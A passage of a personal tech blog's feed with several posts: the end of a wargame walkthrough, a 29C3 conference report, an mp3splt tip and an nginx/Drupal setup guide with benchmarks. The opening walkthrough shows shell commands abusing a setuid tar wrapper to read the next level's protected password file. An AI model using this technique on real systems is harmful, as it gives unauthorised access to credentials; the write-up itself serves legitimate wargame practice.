<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv)
{
        <span style="color:#6ab825;font-weight:bold">char</span> *args[] = { <span style="color:#ed9d13">&#34;/bin/tar&#34;</span>, <span style="color:#ed9d13">&#34;cf&#34;</span>, <span style="color:#ed9d13">&#34;/tmp/ownership.$$.tar&#34;</span>, argv[<span style="color:#3677a9">1</span>], argv[<span style="color:#3677a9">2</span>], argv[<span style="color:#3677a9">3</span>] };
        execv(args[<span style="color:#3677a9">0</span>], args);
}
</code></pre></div><p><strong>$$</strong> expands to the process ID of the shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo $$
24489
</code></pre></div><p>Let&rsquo;s make some observations:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
-r-------- 1 vortex3 vortex3 10 2011-11-14 18:15 /etc/vortex_pass/vortex3
vortex2@melissa:~$ ls -l /vortex/vortex2
-r-sr-x--- 1 vortex3 vortex2 7134 2011-11-13 23:07 /vortex/vortex2
</code></pre></div><p>The password file is owned by <strong>vortex3</strong>. And the binary <strong>/vortex/vortex3</strong> is allowed to read this file. So we are allowed to tar this file using the binary. The binary itself expects 3 arguments. There we go:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
/bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
/bin/tar: Exiting with failure status due to previous errors
vortex2@melissa:/etc/vortex_pass$ ls -l &#39;/tmp/ownership.$$.tar&#39;
-rw-r--r-- 1 vortex3 vortex2 10240 2012-10-31 18:59 /tmp/ownership.$$.tar
vortex2@melissa:/etc/vortex_pass$ cd /tmp/****
vortex2@melissa:/tmp/****$ cp &#39;/tmp/ownership.$$.tar&#39; .
cp: cannot create regular file `./ownership.$$.tar&#39;: Permission denied
</code></pre></div><p>Obviously we are not allowed to copy/untar the file. What about STDOUT?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tar xf &#39;/tmp/ownership.$$.tar&#39; -O
*******
</code></pre></div><p>Password revealed. Next level!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>CCC / 29C3</title>
      <link>https://blog.dornea.nu/2012/12/30/ccc-/-29c3/</link>
      <pubDate>Sun, 30 Dec 2012 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2012/12/30/ccc-/-29c3/</guid>
      <content:encoded><![CDATA[<h2 id="description">Description</h2>
<blockquote>
<p>&ldquo;The 29th Chaos Communication Congress (29C3) is an annual four-day conference on technology, society and utopia. The Congress offers lectures and workshops on a multitude of topics including (but not limited to) information technology and generally a critical-creative attitude towards technology and the discussion about the effects of technological advances on society.</p>
<p>For 29 years, the congress has been organized by the community and appreciates all kinds of participation. You are encouraged to contribute by volunteering, setting up and hosting hands-on events with the other components of your assembly or presenting your own projects to fellow hackers.&rdquo; (Source <a class="https" href="https://events.ccc.de/congress/2012/wiki/Main_Page">official page</a>)</p>
</blockquote>
<h2 id="schedule">Schedule</h2>
<p>Have a look at the <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/">official Fahrplan</a>.</p>
<h2 id="day-1">Day 1</h2>
<p>Besides the fact that my trip to Hamburg was a short one (I got there by some lift), the <code>check-in</code> process was a little bit&hellip; slow! The line was about 400m but that shouldn&rsquo;t be the first surprise I should experience on that day. Before getting my ticket, I got schocked: <code>Only cash payment!</code> C&rsquo;mon! How comes there is no card payment on such a big congress? Anyway, I had to go back to the railway station and withdraw some money. I went back and there it is: My 2nd surprise. Some ugly black-hat (yeah&hellip;he was black-hat w000t!) guy won&rsquo;t let me in!</p>
</p>
<blockquote>
<p>He: &ldquo;You should stand in the line! Here&rsquo;s no entry!&rdquo;
Me: &ldquo;But I was aleady there. I had to get some money for my ticket.&rdquo;
He: &ldquo;Yeah, sure!&rdquo;</p>
</blockquote>
<p>[bla bla &hellip;] Damn idiot!</p>
<p>Well finally I got in and I&rsquo;ve visited the <strong>first talk</strong> on Day #1: <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5221.en.html"><code>Cyberpeace statt Cyberwar</code></a> (Cyberpeace beside Cyberwar). Nothing interesting to mention about. I mean we all know there is <em>cyberwar</em> out there, carryied out by big nations like the USA, Russia, Iran and also Germany. I know we should make peace and not war. But there was nothing special related to the talk. Well actually there is sth to mention: I lost my cap in Hall 6.</p>
<p>The <strong>2nd talk</strong> was about <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5167.en.html">Setting mobile phones free</a>. There was some dutch <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/speakers/3860.en.html">guy</a> who spoke about some project in Netherlands called <a class="https" href="https://limesco.org/wordpress/">Limesco</a>. A really interesting talk about seeting your own mobile network, legal concerning, pricing modells and all the benefits this should bring to us (hackers).</p>
<p>After some short break I went to the <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5095.en.html">Privay and the car of the future</a> talk. A really funny and informative one! I really wanted to see the most interesting <strong>talk of the day</strong> <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5400.en.html">Hacking Cisco Phones</a>, but I had to go to the hotel and check in. I heard it was a quite technically talk and I feel sorry I couldn&rsquo;t see it too.</p>
<h2 id="day-2">Day 2</h2>
<p>At the beginning of the day I did some sightseeing along with some cool guy from Australia called <em>Rupert</em> (Hi dude, thanks for your company!). I must admit that Hamburg has very cool and beautiful places worth to see.</p>
<p>At the first talk of the day <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5091.en.html">(In)security of hardware-based encryption</a> I had a lot of fun watching Tilo making fun of the SSDs vendors and their <code>(in)security</code>. Make sure you watch the PoC <a class="http" href="http://www1.cs.fau.de/sed">videos</a>. I was surprised how easy you can steal/dump data from stolen laptops. I think I should have a closer look at those <strong>evil maid attacks</strong> (especially on encrypted hard drives)</p>
<p>What came next was about to be the best talk I&rsquo;ve seen at 29C3. <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5088.en.html">MANY TAMAGOTCHIS WERE HARMED IN THE MAKING OF THIS PRESENTATION</a>! Yeah, indeed! :-)Â I&rsquo;ve had a lot of fun watching listening/watching to Natalie Silvanovich who loves tamagotchis and wanted to RE (Reverse Engineer) them. Since I&rsquo;ve never done RE before, it was a good opportunity for me to get introduced to the whole topic. I was very pleased to know which steps have to be done, in order to get useful information from some piece of hardware. And yes: I do feel sorry for the many tamagotchis harmed during the experiments! :-)Â @Natalie: <strong>I hope you&rsquo;ll finally get your test programm!</strong></p>
<p>Since I&rsquo;m very interested in cryptography I HAD to see <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5275.en.html">FactHacks: RSA factorization in the real world</a>. In fact the autors tried to convince us (hackers!) that we should stop using private keys based on RSA. I was surprised how fast such a factorization can be (if you got the proper hardware and the right algos). And by the way: <a class="http" href="http://sagemath.org/">sagemath</a> really rocks! If you have a good understanding of basic maths you should <em>watch</em> the whole presentation. You won&rsquo;t get disappointed! <strong>Lesson of the talk:</strong> Don&rsquo;t try to <a class="http" href="http://crypto.2012.rump.cr.yp.to/87d4905b6d2fbc6ad2389debb73f7035.pdf">FUCK A DUCK!</a>Â :-D</p>
<p><a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5219.en.html">How I met your pointer?</a> What?! Ohh.. <em>Hijacking client software for fuzz and profit</em>. Ahhh..Now I see! Well we had a lot of fun! This guy (Carlos :D) was very hilarious and had a really funny presentation (worth watching it!). Besides that he started to throw small pieces of chocolate at us! Well not randomly.. Every time his question got answered correctly! :-DÂ I really liked the story about his wife (interesting slide btw!) and that bacterium analogy. I didn&rsquo;t quite get the point but I think I wasn&rsquo;t the only one.</p>
<h2 id="day-3">Day 3</h2>
<p>Not really much to say about this day. I got very disappointed by the first talk <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5205.en.html">Blackhole Exploit Kit Analysis</a>. I don&rsquo;t really know what the lecturer intended to achieve presenting that&hellip;crap! Well I should stop criticizing&hellip;</p>
<p>The 2nd and my last talk at 29C3 should be a short one since I had to leave suddenly to get my car lift. Mister Wander from the Duisburg University had a talk about <a class="http" href="http://events.ccc.de/congress/2012/Fahrplan/events/5146.en.html">Secure Name Resolution: DNSSec, DNSCurve and Namecoin</a>. I&rsquo;ll have to watch the whole presentation. At least the beginning was very interesting and quite technical.</p>
<h2 id="streams">Streams</h2>
<p>Get the <a class="http" href="http://mirror.fem-net.de/CCC/29C3/mp4-h264-HQ/">streams</a> for offline watching.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I really had a great time at 29C3! There was enough place to stay at and talk to different people. I&rsquo;ve seen great talks and learned a lot (especially about hardware hacking which is somehow foreign to me). Greetings go to: shift and his crew, Rupert, skier, the nullsecurity.net team and all the other people I&rsquo;ve talked to.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Split MP3s by silence detection using mp3splt</title>
      <link>https://blog.dornea.nu/2012/04/01/howto-split-mp3s-by-silence-detection-using-mp3splt/</link>
      <pubDate>Sun, 01 Apr 2012 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2012/04/01/howto-split-mp3s-by-silence-detection-using-mp3splt/</guid>
      <content:encoded><![CDATA[<p>This is probably the most useful command when it comes to <strong>splitting large mp3 files</strong>. You&rsquo;ll need <code>mp3splt</code> (<a href="http://mp3splt.sourceforge.net">http://mp3splt.sourceforge.net</a>) and you&rsquo;re ready to go:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">mp3splt -s -p th=-40,min=6,rm
</code></pre></div><p>Parameters explanation:</p>
<ul>
<li><code>'-s</code>': silence mode; activate silence detection</li>
<li><code>'-p</code>': specify arguments for the silence mode</li>
<li><code>'th=-40</code>': threshold level (dB) to be considered silence</li>
<li><code>'min=6</code>': minimum number of seconds to be considered as splitpoint</li>
<li><code>'rm</code>': remove silence from splitted files</li>
</ul>
<p>Be sure to have a look at the <code>manpage</code>. Happy splitting!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Have a web performance boost with Nginx</title>
      <link>https://blog.dornea.nu/2012/01/26/howto-have-a-web-performance-boost-with-nginx/</link>
      <pubDate>Thu, 26 Jan 2012 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2012/01/26/howto-have-a-web-performance-boost-with-nginx/</guid>
      <content:encoded><![CDATA[<h2 id="why-nginx">Why Nginx?</h2>
<p>Since I wanted to improve my sites load speed I thought I should look around for some lighttpd-alternatives which I have used for so many years. The really annoying thing about <code>lighttpd</code> is its configuration syntax. I don&rsquo;t think it&rsquo;s comprehensive nor easy to learn. Besides that I wanted to have a configuration where <code>memcahed</code> plays a major role: Serve static content (html) from memcache. Lighttpd does have some modules/tutorials how to interact with <code>memcached</code> but I couldn&rsquo;t find any working configuration. Frustration but also curiosity brought me to <code>Nginx</code>.</p>
<p>According to the author Nginx <code>is an HTTP and reverse proxy server, as well as a mail proxy server</code>. I thought I should give it a try and test its performance against Lighttpd. Meanwhile I&rsquo;m using Lighttpd <code>'AND</code>' Nginx on my server due to some regexp issue that have to be solved very soon. In that case Nginx acts a a proxy server (see below for configuration stuff).</p>
<h2 id="get-it">Get it!</h2>
<p>Before going further you should have the latest (stable) available Nginx version. If you use Debian make sure, you add following to your <code>/etc/apt/sources.list</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">deb-src http://nginx.org/packages/debian/ squeeze nginx
</code></pre></div><p>On my system I have currently version <code>1.0.9-1</code> installed.</p>
<h2 id="basic-configuration">Basic configuration</h2>
<p>The main file for this part is <code>/etc/nginx/nginx.conf</code>. This is my <code>nginx.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">user www-data;
worker_processes  5;
worker_rlimit_nofile 8192;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;

events {
    worker_connections  4096;
    use epoll;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    keepalive_requests    50;
    keepalive_timeout     300 300;

    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39;
                      &#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39;
                      &#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;;

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #cp_nopush     on;

    # Compression
    gzip on;
    gzip_buffers 16 8k;
    gzip_comp_level 2;
    gzip_http_version 1.1;
    gzip_min_length 10;
    gzip_types text/plain text/css application/x-javascript text/xml;
    gzip_vary on;
    gzip_proxied any;
    gzip_disable &#34;MSIE [1-6].&#34;;

    include /etc/nginx/conf.d/*.conf;
}
</code></pre></div><p>I won&rsquo;t explain every line since this is not what I&rsquo;m supposed to do. Please have a look at the links at the end of this article for additional links.</p>
<h2 id="vhost-configuration">vHost configuration</h2>
<p>Well this is probably the most interesting part. You should have a configuration file per each vhost located at <code>/etc/nginx/conf.d/</code>. In my case the configuration was adapted to Drupals system and needs. Let&rsquo;s have a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">server {
        listen 80;
        server_name dornea.nu;

        root /var/www/sites/dornea.nu/htdocs/current; ## &lt;-- Your only path reference.

        ## Drupal Boost with nginx 
        set $boost &#34;&#34;;
        set $boost_query &#34;_&#34;;

        if ( $request_method = GET ) { 
                set $boost G;
        }

        if ($http_cookie !~ &#34;DRUPAL_UID&#34;) {
            set $boost &#34;${boost}D&#34;;
        }

        if ($query_string = &#34;&#34;) {
            set $boost &#34;${boost}Q&#34;;
        }

        if ( -f $document_root/cache/normal/$host$request_uri$boost_query.html ) {
            set $boost &#34;${boost}F&#34;;
        }

        if ($boost = GDQF){
            rewrite ^.*$ /cache/normal/$host/$request_uri$boost_query.html break;
        }

        location = /favicon.ico {
                log_not_found off;
                access_log off;
        }

        location = /robots.txt {
                allow all;
                log_not_found off;
                access_log off;
        }

        # This matters if you use drush
        location = /backup {
                auth_basic            &#34;Restricted&#34;;
                auth_basic_user_file  /etc/lighttpd/lighttpd_passwords.inc;
                #deny all;
        }

        # Very rarely should these ever be accessed outside of your lan
        location ~* .(txt|log)$ {
                allow 192.168.0.0/16;
                deny all;
        }

        location ~ ..*/.*.php$ {
                return 403;
        }

        location / {

                set $memcached_key &#34;nginx:$request_uri&#34;;
                memcached_pass 127.0.0.1:11211;
                default_type       text/html;

                error_page 404 405 502 = @fallback;
                autoindex  on;
        }

        location @fallback {
                try_files $uri @rewrite;
        } 

        location @rewrite {
                # Some modules enforce no slash (/) at the end of the URL
                # Else this rewrite block wouldn&#39;t be needed (GlobalRedirect)
                #rewrite ^/system/test/(.*)$     /index.php?q=system/test/$1;
                #rewrite ^/system/files/(.*)$    /index.php?q=system/files/$1;
                rewrite ^/sitemap.xml$          /index.php?q=sitemap.xml;

                rewrite ^/(.*)$                 /index.php?q=$1;
        }

        location ~ .php$ {
                fastcgi_split_path_info ^(.+.php)(/.+)$;
                #NOTE: You should have &#34;cgi.fix_pathinfo = 0;&#34; in php.ini
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                fastcgi_param  VERIFIED $ssl_client_verify;
                fastcgi_param  DN $ssl_client_s_dn;
                fastcgi_intercept_errors on;
        }

        # Fighting with ImageCache? This little gem is amazing.
        location ~ ^/sites/.*/files/imagecache/ {
                try_files $uri @rewrite;
        }
        # Catch image styles for D7 too.
        location ~ ^/sites/.*/files/styles/ {
                try_files $uri @rewrite;
        }

        location ~* .(js|css|png|jpg|jpeg|gif|ico)$ {
                expires 24h;
                log_not_found off;
        }
}
</code></pre></div><p>Having Drupals boost module enabled you should have static pages on your server which will be served by the memcache daemon. At the beginning of the configuration nginx checks if any static content should be served at all (ist the user logged in? etc.) If there is a html file which correlates with the URI then nginx will load the files content from memcache. If not: the PHP script will be executed. Speaking of PHP.. Lets have a look at <code>/etc/nginx/</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># cat /etc/nginx/fastcgi_params 
fastcgi_pass   unix:/tmp/fcgi.sock;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;

fastcgi_index  index.php;

fastcgi_param  REDIRECT_STATUS    200;
</code></pre></div><p>I use a socket instead of child processes. The socket can be created using <code>/etc/init.d/fastcgi</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># cat /etc/init.d/fastcgi </span>
<span style="color:#999;font-style:italic">#!/bin/sh</span>

<span style="color:#999;font-style:italic">### BEGIN INIT INFO</span>
<span style="color:#999;font-style:italic"># Provides:          fastcgi</span>
<span style="color:#999;font-style:italic"># Required-Start:    $local_fs $remote_fs $network $syslog</span>
<span style="color:#999;font-style:italic"># Required-Stop:     $local_fs $remote_fs $network $syslog</span>
<span style="color:#999;font-style:italic"># Default-Start:     2 3 4 5</span>
<span style="color:#999;font-style:italic"># Default-Stop:      0 1 6</span>
<span style="color:#999;font-style:italic"># Short-Description: starts the FastCGI server</span>
<span style="color:#999;font-style:italic"># Description:       starts spawn-fcgi using start-stop-daemon</span>
<span style="color:#999;font-style:italic">### END INIT INFO</span>

<span style="color:#40ffff">PATH</span>=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
<span style="color:#40ffff">DAEMON</span>=/usr/local/bin/php-fastcgi

<span style="color:#24909d">test</span> -x <span style="color:#40ffff">$DAEMON</span> || <span style="color:#24909d">exit</span> <span style="color:#3677a9">0</span>

<span style="color:#24909d">set</span> -e

<span style="color:#40ffff">RETVAL</span>=<span style="color:#3677a9">0</span>
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$1</span><span style="color:#ed9d13">&#34;</span> in
  start)
    <span style="color:#40ffff">$DAEMON</span>
    <span style="color:#40ffff">RETVAL</span>=<span style="color:#40ffff">$?</span>
  ;;
  stop)
    killall -9 php5-cgi
    <span style="color:#40ffff">RETVAL</span>=<span style="color:#40ffff">$?</span>
  ;;
  restart)
    killall -9 php5-cgi
    <span style="color:#40ffff">$DAEMON</span>
    <span style="color:#40ffff">RETVAL</span>=<span style="color:#40ffff">$?</span>
  ;;
  *)
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;Usage: php-fastcgi {start|stop|restart}&#34;</span>
    <span style="color:#24909d">exit</span> <span style="color:#3677a9">1</span>
  ;;
<span style="color:#6ab825;font-weight:bold">esac</span>
<span style="color:#24909d">exit</span> <span style="color:#40ffff">$RETVAL</span>
</code></pre></div><p><code>php-fastcgi</code> is located at /usr/local/bin/:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># cat /usr/local/bin/php-fastcgi </span>
<span style="color:#999;font-style:italic">#!/bin/sh</span>
/usr/bin/spawn-fcgi -F <span style="color:#3677a9">1</span> -C <span style="color:#3677a9">10</span> -a 127.0.0.1 -s /tmp/fcgi.sock -u www-data -g www-data -f <span style="color:#ed9d13">&#34;/usr/bin/php5-cgi -c /etc/php5/cgi/php.ini&#34;</span> -P /var/run/fastcgi-php.pid
</code></pre></div><h2 id="nginx-as-proxy-server">Nginx as proxy server</h2>
<p>As already mentioned nginx can be used as a proxy server. In my case I need nginx to redirect requests on a certain subdomain to <code>lighttpd</code> listening to a local interface. The configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">### dl.dornea.nu
server {
    listen 80;
    server_name dl.dornea.nu;
    root /var/www/sites/dl.dornea.nu/htdocs/current;
    rewrite_log on;
    index index.php index.html;

    location / {
        #index index.php index.html;
        proxy_pass         http://127.0.0.1:8080/;
        proxy_redirect     off;
        proxy_set_header   Host             $host;
        proxy_set_header   X-Real-IP        $remote_addr;
        proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_connect_timeout      90;
        proxy_send_timeout         90;
        proxy_read_timeout         90;

        proxy_buffer_size          4k;
        proxy_buffers              4 32k;
        proxy_busy_buffers_size    64k;
        proxy_temp_file_write_size 64k;
    } 

    location ~* .(js|css|png|jpg|jpeg|gif|ico)$ {
        expires 24h;
        log_not_found off;
    }
}
</code></pre></div><p>All requests to <code>'dl.dornea.nu/*</code>' will be redirected to <code>'http://127.0.0.1:8080</code>'. Isn&rsquo;t that simple? Simple configuration, no need for magic!</p>
<h2 id="benchmarks">Benchmarks</h2>
<h3 id="ab-apache-suite-benchmark">ab (apache suite) benchmark</h3>
<h4 id="lighttpd">lighttpd</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ab -n <span style="color:#3677a9">1000</span> -c <span style="color:#3677a9">2</span> http://dornea.nu/
This is ApacheBench, Version 2.3 &lt;<span style="color:#40ffff">$Revision</span>: <span style="color:#3677a9">655654</span> $&gt;
Copyright <span style="color:#3677a9">1996</span> Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking dornea.nu (be patient)
Completed <span style="color:#3677a9">100</span> requests
Completed <span style="color:#3677a9">200</span> requests
Completed <span style="color:#3677a9">300</span> requests
Completed <span style="color:#3677a9">400</span> requests
Completed <span style="color:#3677a9">500</span> requests
Completed <span style="color:#3677a9">600</span> requests
Completed <span style="color:#3677a9">700</span> requests
Completed <span style="color:#3677a9">800</span> requests
Completed <span style="color:#3677a9">900</span> requests
Completed <span style="color:#3677a9">1000</span> requests
Finished <span style="color:#3677a9">1000</span> requests

Server Software:        lighttpd/1.4.28
Server Hostname:        dornea.nu
Server Port:            <span style="color:#3677a9">80</span>

Document Path:          /
Document Length:        <span style="color:#3677a9">48134</span> bytes

Concurrency Level:      <span style="color:#3677a9">2</span>
Time taken <span style="color:#6ab825;font-weight:bold">for</span> tests:   1438.721 seconds
Complete requests:      <span style="color:#3677a9">1000</span>
Failed requests:        <span style="color:#3677a9">2</span>
   (Connect: 0, Receive: 0, Length: 2, Exceptions: 0)
Write errors:           <span style="color:#3677a9">0</span>
Total transferred:      <span style="color:#3677a9">48619020</span> bytes
HTML transferred:       <span style="color:#3677a9">48133998</span> bytes
Requests per second:    0.70 [<span style="color:#999;font-style:italic">#/sec] (mean)</span>
Time per request:       2877.441 [ms] (mean)
Time per request:       1438.721 [ms] (mean, across all concurrent requests)
Transfer rate:          33.00 [Kbytes/sec] received

Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:       <span style="color:#3677a9">36</span>   <span style="color:#3677a9">41</span>  18.8     <span style="color:#3677a9">39</span>     <span style="color:#3677a9">271</span>
Processing:  <span style="color:#3677a9">1369</span> <span style="color:#3677a9">2836</span> 1314.7   <span style="color:#3677a9">2641</span>   <span style="color:#3677a9">15499</span>
Waiting:     <span style="color:#3677a9">1215</span> <span style="color:#3677a9">2649</span> 1306.8   <span style="color:#3677a9">2467</span>   <span style="color:#3677a9">15346</span>
Total:       <span style="color:#3677a9">1406</span> <span style="color:#3677a9">2877</span> 1314.6   <span style="color:#3677a9">2680</span>   <span style="color:#3677a9">15536</span>

Percentage of the requests served within a certain <span style="color:#24909d">time</span> (ms)
  50%   <span style="color:#3677a9">2680</span>
  66%   <span style="color:#3677a9">2903</span>
  75%   <span style="color:#3677a9">3062</span>
  80%   <span style="color:#3677a9">3208</span>
  90%   <span style="color:#3677a9">3841</span>
  95%   <span style="color:#3677a9">5057</span>
  98%   <span style="color:#3677a9">6924</span>
  99%   <span style="color:#3677a9">9111</span>
 100%  <span style="color:#3677a9">15536</span> (longest request)
</code></pre></div><h4 id="nginx">nginx</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ab -n <span style="color:#3677a9">1000</span> -c <span style="color:#3677a9">2</span> http://dornea.nu/
This is ApacheBench, Version 2.3 &lt;<span style="color:#40ffff">$Revision</span>: <span style="color:#3677a9">655654</span> $&gt;
Copyright <span style="color:#3677a9">1996</span> Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking dornea.nu (be patient)
Completed <span style="color:#3677a9">100</span> requests
Completed <span style="color:#3677a9">200</span> requests
Completed <span style="color:#3677a9">300</span> requests
Completed <span style="color:#3677a9">400</span> requests
Completed <span style="color:#3677a9">500</span> requests
Completed <span style="color:#3677a9">600</span> requests
Completed <span style="color:#3677a9">700</span> requests
Completed <span style="color:#3677a9">800</span> requests
Completed <span style="color:#3677a9">900</span> requests
Completed <span style="color:#3677a9">1000</span> requests
Finished <span style="color:#3677a9">1000</span> requests

Server Software:        nginx/1.0.9
Server Hostname:        dornea.nu
Server Port:            <span style="color:#3677a9">80</span>

Document Path:          /
Document Length:        <span style="color:#3677a9">48216</span> bytes

Concurrency Level:      <span style="color:#3677a9">2</span>
Time taken <span style="color:#6ab825;font-weight:bold">for</span> tests:   133.533 seconds
Complete requests:      <span style="color:#3677a9">1000</span>
Failed requests:        <span style="color:#3677a9">0</span>
Write errors:           <span style="color:#3677a9">0</span>
Total transferred:      <span style="color:#3677a9">48451000</span> bytes
HTML transferred:       <span style="color:#3677a9">48216000</span> bytes
Requests per second:    7.49 [<span style="color:#999;font-style:italic">#/sec] (mean)</span>
Time per request:       267.065 [ms] (mean)
Time per request:       133.533 [ms] (mean, across all concurrent requests)
Transfer rate:          354.34 [Kbytes/sec] received

Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:       <span style="color:#3677a9">36</span>   <span style="color:#3677a9">42</span>  18.5     <span style="color:#3677a9">39</span>     <span style="color:#3677a9">268</span>
Processing:   <span style="color:#3677a9">190</span>  <span style="color:#3677a9">225</span>  43.3    <span style="color:#3677a9">212</span>     <span style="color:#3677a9">483</span>
Waiting:       <span style="color:#3677a9">36</span>   <span style="color:#3677a9">43</span>  17.9     <span style="color:#3677a9">40</span>     <span style="color:#3677a9">270</span>
Total:        <span style="color:#3677a9">227</span>  <span style="color:#3677a9">267</span>  52.1    <span style="color:#3677a9">252</span>     <span style="color:#3677a9">713</span>

Percentage of the requests served within a certain <span style="color:#24909d">time</span> (ms)
  50%    <span style="color:#3677a9">252</span>
  66%    <span style="color:#3677a9">259</span>
  75%    <span style="color:#3677a9">262</span>
  80%    <span style="color:#3677a9">269</span>
  90%    <span style="color:#3677a9">299</span>
  95%    <span style="color:#3677a9">371</span>
  98%    <span style="color:#3677a9">471</span>
  99%    <span style="color:#3677a9">481</span>
 100%    <span style="color:#3677a9">713</span> (longest request)
</code></pre></div><h3 id="toolspingdomcom-benchmark">tools.pingdom.com benchmark</h3>
<h4 id="lighttpd-1">lighttpd</h4>
<p><img src="/posts/img/2012/pingdom_nl_dornea.nu_lighttpd.png" alt="lighttpd"></p>
<h3 id="nginx-1">nginx</h3>
<p><img src="/posts/img/2012/pingdom_nl_dornea.nu_nginx.png" alt="lighttpd"></p>
<h2 id="literature">Literature</h2>
<ul>
<li>Nginx
<ul>
<li><a href="http://nginx.org/">http://nginx.org/</a></li>
<li><a href="http://wiki.nginx.org/Main">http://wiki.nginx.org/Main</a></li>
</ul>
</li>
<li>Basic Configuration
<ul>
<li><a href="http://wiki.nginx.org/Configuration">http://wiki.nginx.org/Configuration</a></li>
<li><a href="https://calomel.org/nginx.html">https://calomel.org/nginx.html</a></li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
